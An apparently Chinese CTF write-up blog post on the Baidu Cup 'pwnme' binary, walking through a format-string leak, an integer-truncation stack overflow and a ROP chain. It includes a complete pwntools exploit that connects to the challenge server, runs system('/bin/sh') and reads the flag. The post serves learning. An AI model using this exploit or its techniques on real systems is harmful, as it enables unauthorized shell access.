<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>百度杯11月pwnme | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>

//<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>

        <div class="main">
            <div class="container">
    
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">百度杯11月pwnme</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">一月 16, 2018&nbsp;&nbsp;13:24:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="/2018/01/16/百度杯11月pwnme/13-99-45.jpg" alt=""></p>
<blockquote>
<p>这算是接触pwntools的第一题吧<br>
需要很多二进制知识储备，解释得比较适合新手看，大佬绕行<br>
过程跌跌撞撞，写来纪念一下</p>
</blockquote>
<a id="more"></a>
<p>首先拿到题目，丢IDA，发现是 64位 elf文件</p>
<p><img src="/2018/01/16/百度杯11月pwnme/13-32-01.jpg" alt="">随意找一下，分析出主程序和主循环</p>
<p><img src="/2018/01/16/百度杯11月pwnme/13-32-40.jpg" alt="">大致过程就是先打印欢迎界面 -&gt; 先注册 -&gt; 然后主循环，三个选项，分别是打印信息、修改信息、退出<br>
很容易发现打印信息函数存在明显的格式化字符串漏洞</p>
<p><img src="/2018/01/16/百度杯11月pwnme/13-34-54.jpg" alt="">直接打印存入的信息，是一个很明显的格式化字符漏洞<br>
我们可以构造一个比如<code>%11$x</code> <code>%11$n</code>的payload去泄露内存，以及修改内存<br>
格式化漏洞详情         <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_intro.html" target="_blank" rel="noopener">CTF Wiki-格式化字符串漏洞 </a><br>
然后我们用<code>checksec</code>来看一下程序开了那些保护(github上有此脚本)</p>
<p><img src="/2018/01/16/百度杯11月pwnme/13-42-45.jpg" alt="">``` bash<br>
$ checksec --file pwnme<br>
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE<br>
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		5	pwnme</p>
<pre class="highlight"><code class="">&gt; #### Canary（栈保护）
栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。
#### NX/DEP（堆栈不可执行）
NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
#### PIE/ASLR（地址随机化）
程序和库加载在内存中地址随机化
#### Fortify 
与栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。
#### RelRO
设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。

***以下内容需要先了解ROP***          [详情点此处](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop.html)
可以看出  `Full RELRO`，并不能修改got表劫持控制流，`NX enable`也不能执行栈内数据，而且`Canary`并没用开启。所以有两种思路：一种是利用格式化漏洞泄露`system`的地址，然后修改栈数据劫持控制流，调用`system`；另一种是格式化漏洞泄露`system`地址，然后寻找一个栈溢出漏洞覆盖返回地址劫持控制流
参考了各位大佬的思路得知，溢出点在修改信息的修改密码时：
​``` C
__int64 __usercall modify@&lt;rax&gt;(__int64 s@&lt;rdi&gt;, __int64 dest@&lt;rdx&gt;, __int64 sa, __int64 a4, __int64 desta, __int64 a6, __int64 a7)
{
  int v8; // [sp+18h] [bp-18h]@3
  char v9; // [sp+1Fh] [bp-11h]@1
  void *buf; // [sp+20h] [bp-10h]@1
  void *src; // [sp+28h] [bp-8h]@1
  //申请两个300的堆空间
  src = malloc(300uLL);
  buf = malloc(300uLL);
  puts(&quot;please input new username(max lenth:20): &quot;);
  fflush(stdout);
  v9 = read(0, buf, 300uLL);//从输入读300个字节到buf
  if ( v9 &lt;= 0 || v9 &gt; 20 )//判断长度，超过20则退出
  {
    puts(&quot;len error(max lenth:20)!try again..&quot;);
    fflush(stdout);
    *(_QWORD *)s = sa;//应该是个结构体，退出时修改会原来的值
    *(_QWORD *)(s + 8) = a4;
    *(_QWORD *)(s + 16) = desta;
    *(_QWORD *)(s + 24) = a6;
    *(_QWORD *)(s + 32) = a7;
  }
  else
  {
    memset(&amp;sa, 0, 20uLL);//名字部分，20字节置0
    strcpy((char *)&amp;sa, (const char *)buf);//字符串拷贝过去，遇0终止

    puts(&quot;please input new password(max lenth:20): &quot;);
    fflush(stdout);
    v8 = read(0, src, 300uLL);
    if ( (_BYTE)v8 &amp;&amp; (unsigned __int8)v8 &lt;= 20u )//问题出在这，输入的长度被类型转换了，由int转成btye，当输入的长度为0x(n*100)至0x(n*100)+0x20都能绕过(n&gt;=1),形成栈溢出
    {
      memset((char *)&amp;desta + 4, 0, 20uLL);
      sub_400A90(src, v8);
      memcpy((char *)&amp;desta + 4, src, v8);//用memcpy拷贝，不会遇到0停止
      fflush(stdout);
      *(_QWORD *)s = sa;
      *(_QWORD *)(s + 8) = a4;
      *(_QWORD *)(s + 16) = desta;
      *(_QWORD *)(s + 24) = a6;
      *(_QWORD *)(s + 32) = a7;
    }
    else
    {
      puts(&quot;len error(max lenth:20)!try again..&quot;);
      fflush(stdout);
      *(_QWORD *)s = sa;
      *(_QWORD *)(s + 8) = a4;
      *(_QWORD *)(s + 16) = desta;
      *(_QWORD *)(s + 24) = a6;
      *(_QWORD *)(s + 32) = a7;
    }
  }
  return s;
}
</code></pre>
<p>如上代码分析，我们已经找到一个泄露点和一个溢出点，接下来就需要找到<code>gadget</code>，意思是找到相应的代码，然后跳到此处利用。<br>
找<code>gadget</code>需要一些技巧以及经验(这也是我缺少的。。。)<br>
首先我们得了解linux x64是怎么传参的<br>
它不同于x86的栈传参，它是优先6个寄存器传参，依次是<code>RDI</code>,<code>RSI</code>,<code>RDX</code>,<code>RCX</code>,<code>R8</code>,<code>R9</code>，然后多余的参数才传进栈内<br>
我的思路是先leak到<code>system</code>的位置，再寻找适当的<code>gadget</code>将栈上参数pop进寄存器然后再调用<code>read</code>函数将<code>/bin/sh</code>写到<code>.bss</code>段，然后再劫持控制流到<code>pop rdi;ret</code>来起<code>shell</code><br>
找<code>gadget</code>的工具有很多，简单的<code>objdump</code>和<code>IDA</code>查找也是可以的，也可以用一些工具</p>
<blockquote>
<p><a href="https://github.com/packz/ropeme" target="_blank" rel="noopener">ROPEME - https://github.com/packz/ropeme</a><br>
<a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">Ropper -  https://github.com/sashs/Ropper</a><br>
<a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">ROPgadget - https://github.com/JonathanSalwan/ROPgadget/tree/master</a><br>
<a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">rp++ - https://github.com/0vercl0k/rp</a></p>
</blockquote>
<p>来寻找适合的<code>gadget</code><br>
我找到的是第一个<code>0x400ECB - pop_4_ret gadget</code> 和第二个<code>0x400EB0 - mov_call gadget</code> 以及最后一个<code>0x400ed3 - pop_rdi_ret gadget</code></p>
<pre class="highlight"><code class="armasm"><span class="symbol">.text</span>:<span class="number">00400</span>EB0		<span class="keyword">mov </span>    rdx, <span class="built_in">r13</span>    <span class="comment">;第二个gadget</span>
<span class="symbol">.text</span>:<span class="number">00400</span>EB3		<span class="keyword">mov </span>    rsi, <span class="built_in">r14</span>
<span class="symbol">.text</span>:<span class="number">00400</span>EB6		<span class="keyword">mov </span>    edi, r15d
<span class="symbol">.text</span>:<span class="number">00400</span>EB9		call    qword ptr [<span class="built_in">r12</span>+rbx*<span class="number">8</span>]
<span class="symbol">.text</span>:<span class="number">00400</span>EBD		<span class="keyword">add </span>    rbx, <span class="number">1</span>
<span class="symbol">.text</span>:<span class="number">00400</span>EC1		<span class="keyword">cmp </span>    rbx, rbp
<span class="symbol">.text</span>:<span class="number">00400</span>EC4		jnz     short loc_400EB0
<span class="symbol">
.text:</span><span class="number">00400</span>EC6		<span class="keyword">add </span>    rsp, <span class="number">8</span>
<span class="symbol">.text</span>:<span class="number">00400</span>ECA		<span class="keyword">pop </span>    rbx
<span class="symbol">.text</span>:<span class="number">00400</span>ECB		<span class="keyword">pop </span>    rbp <span class="comment">;第一个gadget</span>
<span class="symbol">.text</span>:<span class="number">00400</span>ECC		<span class="keyword">pop </span>    <span class="built_in">r12</span>
<span class="symbol">.text</span>:<span class="number">00400</span>ECE		<span class="keyword">pop </span>    <span class="built_in">r13</span>
<span class="symbol">.text</span>:<span class="number">00400</span>ED0		<span class="keyword">pop </span>    <span class="built_in">r14</span>
<span class="symbol">.text</span>:<span class="number">00400</span>ED2		<span class="keyword">pop </span>    <span class="built_in">r15</span>
<span class="symbol">.text</span>:<span class="number">00400</span>ED4		retn

；<span class="keyword">pop_ret </span>gadget
<span class="number">0x00400ed3</span> : <span class="keyword">pop </span>rdi <span class="comment">; ret</span>

</code></pre>
<p>第一和第二个链各个配对的<code>gadget</code>是IDA找到的,<code>pop_ret</code>是ROPgadget脚本找到的<br>
回顾一下思路</p>
<blockquote>
<ol>
<li>先leak到<code>system</code>的位置</li>
<li>寻找适当的<code>gadget</code>将栈上参数pop进寄存器然后再调用<code>read</code>函数将<code>/bin/sh</code>写到<code>.bss</code>段</li>
<li>然后再劫持控制流到<code>pop rdi;ret</code>来起<code>shell</code></li>
</ol>
</blockquote>
<p><code>.bss</code>具有可写可读的性质故将<code>/bin/sh</code>写在这段上<br>
段地址可以通过<code>readelf</code>确定</p>
<pre class="highlight"><code class="bash">$ readelf -S pwnme 
There are 27 section headers, starting at offset 0x2128:
Section Headers:
[Nr] Name     Type       Address           Offset Size  EntSize          Flags  Link  Info  Align
....
[24] .bss    NOBITS    0000000000602010    00002010 0000000000000020  0000000000000000  WA       0     0     16

</code></pre>
<p>得到<code>.bss</code>地址是<code>0x602010</code><br>
然后我们回到第一步，泄露<code>system</code>的地址。<br>
我利用的是<code>pwntool</code>里面带的<code>DynElf</code>来寻找<code>system</code>在内存中的地址，其实就是利用格式化字符串漏洞泄露内存，然后它执行一个遍历找到目标地址<br>
<em><strong>以下内容需要了解 Pwntool DynElf</strong></em>（很多资料，多谷歌吧）<br>
利用代码如下：</p>
<pre class="highlight"><code class="python"><span class="comment">#coding:utf-8</span>
<span class="keyword">from</span> pwn <span class="keyword">import</span> *

<span class="comment">#pro = process('./pwnme')</span>
pro = remote(<span class="string">'106.75.66.195'</span>, <span class="number">13002</span>)<span class="comment">#连接端口</span>

<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span><span class="comment">#学大佬的一个姿势，看起来还不错。作用就是等接收到特定字符再发送想要发送到payload</span>
	pro.recvuntil(recv_buf)
	<span class="keyword">if</span> new_line:
		pro.sendline(send_buf)
	<span class="keyword">else</span>:
		pro.send(send_buf)
<span class="function"><span class="keyword">def</span> <span class="title">loop</span><span class="params">(address)</span>:</span><span class="comment">#就是给DynElf用的一个函数，用来输入一个地址，得到一个内存地址内容返回，以遍历出目标地址</span>
	respone(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)
	respone(<span class="string">'please input new username(max lenth:20): \n'</span>,<span class="string">'%11$sflag'</span>)<span class="comment">#payload是11是因为我们写入的参数就在第十一个参数的地方，看不懂的话请回到格式化漏洞。当然你也可以直接写到下面的password写成%12$s</span>
	respone(<span class="string">'please input new password(max lenth:20): \n'</span>,<span class="string">'ABCD'</span>+p64(address))<span class="comment">#填充了四个字节之后才是栈内第十一个参数</span>
	respone(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)
	data = pro.recvuntil(<span class="string">'flag'</span>)[:<span class="number">-4</span>]
	<span class="keyword">if</span> data == <span class="string">""</span>:
		data = <span class="string">"\x00"</span>
	<span class="comment">#print data,"add=&gt;",p64(address)</span>
	<span class="keyword">return</span> data
<span class="comment">#一开始注册的两句话，随便填</span>
respone(<span class="string">'Input your username(max lenth:40): \n'</span>,<span class="string">'123'</span>)
respone(<span class="string">'Input your password(max lenth:40): \n'</span>,<span class="string">'123'</span>)

<span class="comment">#调用DynElf遍历	</span>
d = DynELF(loop, elf=ELF(<span class="string">'./pwnme'</span>))
system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)
<span class="keyword">print</span> hex(system_addr)
</code></pre>
<p>接下来就是了解栈结构然后用栈溢出劫持控制流了<br>
我用的是IDA远程调试虚拟机找到栈结构确定是输入password 40字节后是返回地址，你也可以利用<code>pattent.py</code>这个脚本配合<code>gdb</code>调试来寻找<br>
<code>gdb</code>具体步骤如下:<br>
首先生成一个溢出的payload 0x100-0x120均可(前面代码有分析为什么是这个长度)，在此我选择生成0x110即272长度的payload</p>
<pre class="highlight"><code class="bash">$ python pattern.py  create 272
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj
</code></pre>
<p>然后<code>gdb ./pwnme</code>调试程序</p>
<pre class="highlight"><code class="bash">Starting program: /home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme 
**********************************************
*                                            *
*              Have fun!Pwn me               *
*                                            *
**********************************************
Register Account first!
Input your username(max lenth:40): 
123
Input your password(max lenth:40): 
123
Register Success!!

1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit System:
&gt;2
please input new username(max lenth:20): 
123
please input new password(max lenth:20): 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400ad0 <span class="keyword">in</span> ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[──────────────────────────────────REGISTERS───────────────────────────────────]
*RAX  0x7fffffffde50 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)
 RBX  0x0
*RCX  0x6038e0 ◂— 0x0
*RDX  0x10
*RDI  0x7fffffffde50 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)
*RSI  0x6038f0 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)
*R8   0x1
*R9   0x7fffffffde40 ◂— 0x111004010a8
*R10  0x603af0 ◂— 0x0
*R11  0x7fffffffdf41 ◂— 0x3269413169413069 (<span class="string">'i0Ai1Ai2'</span>)
*R12  0x400770 ◂— xor    ebp, ebp
*R13  0x7fffffffe080 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x4132624131624130 (<span class="string">'0Ab1Ab2A'</span>)
*RSP  0x7fffffffde78 ◂— 0x3562413462413362 (<span class="string">'b3Ab4Ab5'</span>)
*RIP  0x400ad0 ◂— ret    
[────────────────────────────────────DISASM────────────────────────────────────]
 ► 0x400ad0    ret    &lt;0x3562413462413362&gt;
</code></pre>
<p>可以看到在内存地址<code>0x3562413462413362</code>发生了段错误，然后我们用<code>pattent.py</code>寻找位移得知位移为<code>40 Bytes</code><br>
(我的gdb装了pwnbdg插件所以会跟一般的gdb显示不同，pwndbg在github上有)</p>
<pre class="highlight"><code class="bash">$ python pattern.py  offset 0x3562413462413362
hex pattern decoded as: b3Ab4Ab5
40
</code></pre>
<p>然后我们就可以在填充了40个字节的数据之后填上我们的劫持地址了</p>
<pre class="highlight"><code class="python"><span class="comment">#exploit</span>
<span class="comment">#修改名字随便</span>
respone(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)
respone(<span class="string">'please input new username(max lenth:20): \n'</span>,<span class="string">'123'</span>)
<span class="comment">#找到一个pop几个参数进rsi,rdi,rdx供read使用</span>
<span class="comment">#rbx和rbp是为了call之后代码继续执行会进行一个add rbx, 1;cmp rbx, rbp ;jnz back;</span>
<span class="comment">#所以我们将0 pop 给rbx 将 1 pop 给 rbp 给它继续执行下去</span>
<span class="comment">#0x400eca : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span>
<span class="comment">#0x400eb0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call [r12+rbx*8]</span>
pop_6_ret = <span class="number">0x400eca</span>
call_address = <span class="number">0x400eb0</span>
pop_rdi_ret = <span class="number">0x400ed3</span>
read_got = <span class="number">0x601FC8</span><span class="comment">#read之前已经调用，直接读取got就好了</span>
<span class="comment">#.bss</span>
bin_sh_addr = <span class="number">0x602010</span>
<span class="comment">#first ret address is 40 bytes</span>
payload =  <span class="string">'A'</span>*<span class="number">40</span>
<span class="comment">#pop 进寄存器</span>
payload +=  p64(pop_6_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh_addr)+p64(<span class="number">0</span>)<span class="comment">#作用就是劫持控制流到pop_6_ret处执行，然后分别pop 0-&gt;rbx ; pop 1-&gt;rbp ;pop read_got -&gt;r13;pop 8 -&gt;r14  ;pop 1-&gt;r15 ;对应下一个gadget的mov给read三个传参</span>
<span class="comment"># call read</span>
 <span class="comment">#7个0x1对应call之后的7个pop，无关紧要，我们只想要ret，实在不理解可以看IDA</span>
payload += p64(call_address)+p64(<span class="number">0x1</span>)*<span class="number">7</span> 
<span class="comment">#最后起shell</span>
payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
<span class="comment">#在payload后面填充字符'0'至长度为0x110</span>
payload = payload.ljust(<span class="number">0x110</span>,<span class="string">'0'</span>)
<span class="comment">#发送padload</span>
respone(<span class="string">'please input new password(max lenth:20): \n'</span>,payload)
pro.send(<span class="string">'/bin/sh\x00'</span>)<span class="comment">#将字符串'/bin/sh\x00'读入缓冲区</span>
pro.interactive()<span class="comment">#开启交互</span>
</code></pre>
<p>至此就可以得到shell了<br>
运行脚本</p>
<pre class="highlight"><code class="bash">$ python test.py 
[+] Opening connection to 106.75.66.195 on port 13002: Done
[*] <span class="string">'/home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Loading from <span class="string">'/home/testzero/Desktop/ctf/baidu_11_pwn_pwnme/pwnme'</span>: 0x7f3cefbef150
[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0x7f3cefbef150
[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.
[*] No linkmap found
[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets
[*] Found DT_GNU_HASH at 0x7f3cef9c4be0
[*] Found DT_STRTAB at 0x7f3cef9c4bf0
[*] Found DT_SYMTAB at 0x7f3cef9c4c00
[*] .gnu.hash parms
[*] <span class="built_in">hash</span> chain index
[*] <span class="built_in">hash</span> chain
0x7f3cef64b020
[*] Switching to interactive mode
$ id
uid=1009(pwnme) gid=1009(pwnme) groups=1009(pwnme)
$ cat /home/pwnme/flag.txt
flag{ecfdbab646c8539f75078b76216942ef}
</code></pre>
<p><strong>总结</strong></p>
<blockquote>
<ol>
<li>耗时很久，需要掌握的东西略多</li>
<li>linux 32和64位差异不了解</li>
<li>二进制工具不熟悉,linux调试短板</li>
<li>劳累、耗时程度与成就感成正比</li>
</ol>
</blockquote>
<p><strong>参考文献</strong>(巨多!!!)</p>
<blockquote>
<p><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="noopener">[ 一步一步学ROP之linux_x86篇 - 蒸米 ]</a> <a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-6597.html</a><br>
<a href="http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">[ 一步一步学ROP之linux_x64篇 - 蒸米 ]</a> <a href="http://wps2015.org/drops/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html" target="_blank" rel="noopener">http://wps2015.org/drops/drops/一步一步学ROP之linux_x64篇.html</a><br>
<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html" target="_blank" rel="noopener">[ CTF Wiki - 格式化字符串漏洞 ]</a> <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/index.html</a><br>
<a href="http://www.mottoin.com/92467.html" target="_blank" rel="noopener">[ 百度杯十一月场pwn专题赛—pwnme writeup - Moto ]</a> <a href="http://www.mottoin.com/92467.html" target="_blank" rel="noopener">http://www.mottoin.com/92467.html</a><br>
<a href="https://bbs.ichunqiu.com/thread-16508-1-1.html" target="_blank" rel="noopener">[ 百度杯CTF·十二月PWN专题WriteUp解析 - 一口盐汽水 ]</a> <a href="https://bbs.ichunqiu.com/thread-16508-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-16508-1-1.html</a><br>
<a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">[ 借助DynELF实现无libc的漏洞利用小结 - tianyi201612 ]</a><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a><br>
<a href="http://blog.csdn.net/qq_15514565/article/details/57644132" target="_blank" rel="noopener">[ IA32寄存器与x86-64寄存器的区别 - 转载 ]</a> <a href="http://blog.csdn.net/qq_15514565/article/details/57644132" target="_blank" rel="noopener">http://blog.csdn.net/qq_15514565/article/details/57644132</a><br>
<a href="http://www.mamicode.com/info-detail-1990426.html" target="_blank" rel="noopener">[ 二进制的保护机制 ]</a> <a href="http://www.mamicode.com/info-detail-1990426.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1990426.html</a></p>
</blockquote>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>T3stzer0</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.testzero-wz.com/2018/01/16/百度杯11月pwnme/">https://www.testzero-wz.com/2018/01/16/百度杯11月pwnme/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/CTF/"># CTF</a>
                    
                        <a href="/tag/二进制/"># 二进制</a>
                    
                        <a href="/tag/PWN/"># PWN</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2018/01/16/PythonGUI模拟TCP／IP解、封包/">PythonGUI模拟TCP／IP解、封包</a>
            
            
            <a class="next" rel="next" href="/2017/11/20/2017-LCTF-use_your_IDA/">2017-LCTF-use_your_IDA解析</a>
            
        </section>


    </article>
</div>

        </div>
        <!-- 
<footer id="footer" class="footer">
    <div class="copyright">
        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

-->
<script src="/js/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>
